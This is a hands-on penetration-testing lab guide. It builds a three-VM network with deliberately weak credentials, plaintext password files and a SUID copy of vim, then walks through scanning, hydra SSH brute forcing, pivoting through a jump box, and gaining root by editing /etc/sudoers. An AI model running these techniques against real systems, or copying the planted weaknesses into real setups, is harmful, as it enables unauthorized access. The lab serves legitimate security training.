# Lab 2: iptables, Routing, and Network Pivoting

## Objective

Pivot through a multi-subnet network. Discover targets, find credentials, add routes to reach hidden networks, use SSH tunnels, bypass egress filtering, and use iptables masquerading to access an internal server. Escalate privileges on the final target.

## Skills Practiced

- nmap scanning and web enumeration
- ip route for reaching new subnets
- iptables analysis and understanding
- SSH tunnels blocked by egress filtering
- Chisel as a firewall bypass
- NAT masquerading
- SUID binary privilege escalation
- Writable cron job exploitation

## Prerequisites

CentOS and Ubuntu each need a **second NIC** on the same Host-only VMnet for the 172.16.0.0/24 network.

**On CentOS:**
```bash
sudo ip addr add 172.16.0.1/24 dev ens224
sudo ip link set ens224 up
```

**On Ubuntu:**
```bash
sudo ip addr add 172.16.0.2/24 dev ens38
sudo ip link set ens38 up
```

> Replace `ens224` and `ens38` with your actual interface names.

Verify:
```bash
# From CentOS
ping -c 2 172.16.0.2

# From Ubuntu
ping -c 2 172.16.0.1
```

## Network Diagram

```
ATTACKER                        DMZ NETWORK                    INTERNAL NETWORK

Kali                     Debian (mail server)          CentOS (jump box)
192.168.244.129          192.168.244.132               192.168.244.131
                                                       172.16.0.1
                                                            │
                                                       Ubuntu (file server)
                                                       172.16.0.2
```

**Goal:** Get root on Ubuntu and read `/root/flag.txt`.

---

## Setup

### Debian (mail server — 192.168.244.132)

```bash
sudo apt update
sudo apt install apache2 openssh-server -y

sudo systemctl enable --now apache2
sudo systemctl enable --now ssh

# Create sysadmin user with weak password
sudo useradd -m -s /bin/bash sysadmin
echo "sysadmin:welcome1" | sudo chpasswd

# Create webmail page with hidden info
echo "<h1>Company Webmail Portal</h1>" | sudo tee /var/www/html/index.html
echo "<!-- TODO: remove test page at /internal -->" | sudo tee -a /var/www/html/index.html

# Create hidden internal page with credentials
sudo mkdir -p /var/www/html/internal
echo "<h1>IT Department Notes</h1>" | sudo tee /var/www/html/internal/index.html
echo "<p>Jump box: 192.168.244.131</p>" | sudo tee -a /var/www/html/internal/index.html
echo "<p>SSH user: operator / Pass: J4mpB0x2026!</p>" | sudo tee -a /var/www/html/internal/index.html
echo "<p>Internal network: 172.16.0.0/24</p>" | sudo tee -a /var/www/html/internal/index.html
echo "<p>File server is at 172.16.0.2</p>" | sudo tee -a /var/www/html/internal/index.html

# Enable password authentication for SSH
sudo sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config
sudo systemctl restart ssh

# sysadmin has procedures doc
sudo mkdir -p /home/sysadmin/docs
echo "=== VPN Access Procedures ===" | sudo tee /home/sysadmin/docs/procedures.txt
echo "When VPN is down, use the jump box to reach internal servers" | sudo tee -a /home/sysadmin/docs/procedures.txt
echo "Jump box credentials are on the internal web page" | sudo tee -a /home/sysadmin/docs/procedures.txt
echo "Remember: you need to add a route to 172.16.0.0/24 via the jump box" | sudo tee -a /home/sysadmin/docs/procedures.txt
sudo chown -R sysadmin:sysadmin /home/sysadmin/docs

# Open firewall
sudo iptables -F
sudo iptables -P INPUT ACCEPT
sudo iptables -P FORWARD ACCEPT
sudo iptables -P OUTPUT ACCEPT
```

### CentOS (jump box — 192.168.244.131 + 172.16.0.1)

```bash
sudo systemctl stop firewalld
sudo systemctl disable firewalld
sudo dnf install iptables-services -y

sudo systemctl enable --now sshd

# Create operator user
sudo useradd -m -s /bin/bash operator
echo "operator:J4mpB0x2026!" | sudo chpasswd
sudo usermod -aG wheel operator

# Enable IP forwarding
sudo sysctl -w net.ipv4.ip_forward=1
echo "net.ipv4.ip_forward = 1" | sudo tee -a /etc/sysctl.conf
sudo sysctl -p

# Breadcrumbs for the file server
sudo mkdir -p /home/operator/.config
echo "# File server backup credentials" | sudo tee /home/operator/.config/backup.conf
echo "HOST=172.16.0.2" | sudo tee -a /home/operator/.config/backup.conf
echo "USER=fileadmin" | sudo tee -a /home/operator/.config/backup.conf
echo "PASS=B@ckupStr0ng!" | sudo tee -a /home/operator/.config/backup.conf
sudo chown -R operator:operator /home/operator/.config

# === IPTABLES ===
sudo iptables -A INPUT -i lo -j ACCEPT
sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
sudo iptables -A INPUT -p icmp -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT
sudo iptables -A INPUT -j LOG --log-prefix "JUMP-DROPPED-IN: " --log-level 4
sudo iptables -P INPUT DROP

# Block reverse SSH to Kali
sudo iptables -A OUTPUT -p tcp --dport 22 -d 192.168.244.129 -j LOG --log-prefix "JUMP-BLOCKED-OUT: " --log-level 4
sudo iptables -A OUTPUT -p tcp --dport 22 -d 192.168.244.129 -j DROP
sudo iptables -P OUTPUT ACCEPT

# FORWARD between subnets
sudo iptables -A FORWARD -s 192.168.244.0/24 -d 172.16.0.0/24 -j ACCEPT
sudo iptables -A FORWARD -s 172.16.0.0/24 -d 192.168.244.0/24 -j ACCEPT
sudo iptables -A FORWARD -j LOG --log-prefix "JUMP-DROPPED-FWD: " --log-level 4
sudo iptables -P FORWARD DROP

# NAT (replace ens224 with your interface name)
sudo iptables -t nat -A POSTROUTING -s 192.168.244.0/24 -o ens224 -j MASQUERADE

sudo service iptables save
```

### Ubuntu (file server — 172.16.0.2)

```bash
sudo apt update
sudo apt install openssh-server -y
sudo systemctl enable --now ssh

# Create fileadmin user
sudo useradd -m -s /bin/bash fileadmin
echo "fileadmin:B@ckupStr0ng!" | sudo chpasswd

# Create the flag
echo "FLAG{multi_subnet_pivot_complete_2026}" | sudo tee /root/flag.txt
sudo chmod 600 /root/flag.txt

# SUID vim for privesc
sudo cp /usr/bin/vim.basic /usr/local/bin/vim.escalate
sudo chmod u+s /usr/local/bin/vim.escalate

# Sensitive files
sudo mkdir -p /home/fileadmin/shares
echo "Company financials Q3 2026" | sudo tee /home/fileadmin/shares/financials.txt
echo "Employee SSNs: [REDACTED]" | sudo tee /home/fileadmin/shares/hr_data.txt
sudo chown -R fileadmin:fileadmin /home/fileadmin/shares

# === IPTABLES — only allow from internal network ===
sudo iptables -A INPUT -i lo -j ACCEPT
sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
sudo iptables -A INPUT -p icmp -s 172.16.0.0/24 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 22 -s 172.16.0.0/24 -j ACCEPT
sudo iptables -A INPUT -s 192.168.244.0/24 -j LOG --log-prefix "FILE-BLOCKED-DMZ: " --log-level 4
sudo iptables -A INPUT -s 192.168.244.0/24 -j DROP
sudo iptables -A INPUT -j LOG --log-prefix "FILE-DROPPED: " --log-level 4
sudo iptables -P INPUT DROP
sudo iptables -P OUTPUT ACCEPT
```

---

## Attack Walkthrough

### Phase 1: Reconnaissance

```bash
nmap -sn 192.168.244.0/24
nmap -sV -sC 192.168.244.132 -oN debian_scan.txt
nmap -sV -sC 192.168.244.131 -oN centos_scan.txt
```

### Phase 2: Enumerate Debian

```bash
# Check page source for HTML comments
curl -s 192.168.244.132 | grep "<!--"
# Reveals: /internal

curl 192.168.244.132/internal/
# Reveals: jump box creds (operator / J4mpB0x2026!) and internal network info

# Alternative: brute force SSH
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
      -P /usr/share/seclists/Passwords/Common-Credentials/top-1000.txt \
      ssh://192.168.244.132 -t 4 -f
```

### Phase 3: Access Debian

```bash
ssh sysadmin@192.168.244.132
# Password: welcome1

cat /home/sysadmin/docs/procedures.txt
# Learn about the jump box and routing
```

### Phase 4: Pivot to CentOS

```bash
ssh operator@192.168.244.131
# Password: J4mpB0x2026!

cat /home/operator/.config/backup.conf
# Find: fileadmin / B@ckupStr0ng! at 172.16.0.2

nc -zv 172.16.0.2 22
# Confirms Ubuntu's SSH is reachable from CentOS
```

### Phase 5: Try to reach Ubuntu from Kali

```bash
# No route exists
ping -c 2 172.16.0.2
# "Network is unreachable"

# Add the route
sudo ip route add 172.16.0.0/24 via 192.168.244.131

# Route exists now, but SSH still fails
ssh fileadmin@172.16.0.2
# Blocked — Ubuntu's firewall rejects DMZ traffic
```

**Lesson:** Adding a route isn't enough. Ubuntu's iptables only allows connections from 172.16.0.0/24.

### Phase 6: Try reverse SSH tunnel — blocked

```bash
# From CentOS
ssh -R 9050 kali_user@192.168.244.129
# FAILS

sudo grep "JUMP-BLOCKED" /var/log/messages
# Confirms: egress iptables blocks outbound SSH to Kali
```

### Phase 7: SSH directly from CentOS to Ubuntu

```bash
# From CentOS (already SSH'd in)
ssh fileadmin@172.16.0.2
# Password: B@ckupStr0ng!
# Works — CentOS is on 172.16.0.0/24, which Ubuntu allows
```

### Phase 8: Privilege Escalation

```bash
find / -perm -4000 -type f 2>/dev/null
# /usr/local/bin/vim.escalate — SUID vim

# Use SUID vim to read the flag
/usr/local/bin/vim.escalate /root/flag.txt
# FLAG{multi_subnet_pivot_complete_2026}

# Or escalate to root via sudoers edit
/usr/local/bin/vim.escalate /etc/sudoers
# Add: fileadmin ALL=(ALL) NOPASSWD:ALL
# Save: :wq!
sudo cat /root/flag.txt
```

---

## iptables Rules Breakdown

### CentOS iptables explained

```
INPUT chain:
  1. Loopback allowed (machine talks to itself)
  2. Established/related allowed (responses to connections CentOS started)
  3. ICMP allowed (ping works)
  4. SSH port 22 allowed (remote management)
  5. Everything else: log with prefix "JUMP-DROPPED-IN:" → DROP

OUTPUT chain:
  1. SSH to Kali (192.168.244.129) on port 22: log "JUMP-BLOCKED-OUT:" → DROP
  2. Everything else: ACCEPT

FORWARD chain:
  1. 192.168.244.0/24 → 172.16.0.0/24: ACCEPT
  2. 172.16.0.0/24 → 192.168.244.0/24: ACCEPT
  3. Everything else: log "JUMP-DROPPED-FWD:" → DROP

NAT:
  POSTROUTING: source 192.168.244.0/24 leaving on internal interface → MASQUERADE
```

---

## Attack Chain Summary

```
Phase 1: Recon         → nmap finds HTTP + SSH on Debian, SSH on CentOS
Phase 2: Enumerate     → HTML comment → /internal page → jump box creds
Phase 3: Access        → SSH to Debian, read procedures doc
Phase 4: Lateral Move  → SSH to CentOS, find Ubuntu creds in .config
Phase 5: Route Attempt → ip route add fails (firewall blocks DMZ source)
Phase 6: Tunnel Block  → Reverse SSH blocked by egress iptables
Phase 7: Direct Hop    → SSH from CentOS to Ubuntu (allowed subnet)
Phase 8: Priv Esc      → SUID vim → read flag / edit sudoers
```

## Cleanup

```bash
# Debian
sudo userdel -r sysadmin
sudo rm -rf /var/www/html/internal
sudo iptables -F
sudo iptables -P INPUT ACCEPT

# CentOS
sudo userdel -r operator
sudo iptables -F && sudo iptables -t nat -F
sudo iptables -P INPUT ACCEPT && sudo iptables -P FORWARD ACCEPT && sudo iptables -P OUTPUT ACCEPT

# Ubuntu
sudo userdel -r fileadmin
sudo rm -f /usr/local/bin/vim.escalate /root/flag.txt
sudo iptables -F && sudo iptables -P INPUT ACCEPT
```
